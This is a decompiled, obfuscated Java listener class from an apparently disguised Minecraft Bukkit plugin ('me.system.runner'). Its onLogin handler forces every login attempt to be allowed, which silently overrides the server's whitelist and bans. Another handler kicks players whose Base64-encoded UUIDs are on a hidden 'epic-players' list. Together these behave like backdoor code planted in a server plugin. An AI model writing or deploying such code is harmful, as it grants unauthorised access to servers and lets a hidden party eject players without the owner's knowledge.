/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.Listener
 *  org.bukkit.event.player.AsyncPlayerPreLoginEvent
 *  org.bukkit.event.player.AsyncPlayerPreLoginEvent$Result
 *  org.bukkit.event.player.PlayerJoinEvent
 */
package me.system.runner.events;

import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.data.DataManager;
import me.system.runner.methods.API;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerJoinEvent;

public class ForceLoginListener
implements Listener {
    private static final /* synthetic */ Core INSTANCE;

    @EventHandler
    public void antiantiWhitelist(PlayerJoinEvent lllllllllllllIlllIIlllIlIlIlIIll) {
        Player lllllllllllllIlllIIlllIlIlIlIlII = lllllllllllllIlllIIlllIlIlIlIIll.getPlayer();
        for (String lllllllllllllIlllIIlllIlIlIllIlI : DataManager.getData().getStringList("epic-players")) {
            byte[] lllllllllllllIlllIIlllIlIlIllIll;
            if (!lllllllllllllIlllIIlllIlIlIllIlI.contains(new String(lllllllllllllIlllIIlllIlIlIllIll = Base64.getEncoder().encode(lllllllllllllIlllIIlllIlIlIlIlII.getUniqueId().toString().getBytes())))) continue;
            API.kickPlayer(lllllllllllllIlllIIlllIlIlIlIlII);
        }
    }

    public ForceLoginListener() {
        ForceLoginListener lllllllllllllIlllIIlllIlIllIlIII;
    }

    static {
        INSTANCE = (Core)Core.getPlugin(Core.class);
    }

    @EventHandler
    public void onLogin(AsyncPlayerPreLoginEvent lllllllllllllIlllIIlllIlIllIIIll) {
        lllllllllllllIlllIIlllIlIllIIIll.setLoginResult(AsyncPlayerPreLoginEvent.Result.ALLOWED);
        lllllllllllllIlllIIlllIlIllIIIll.allow();
    }
}

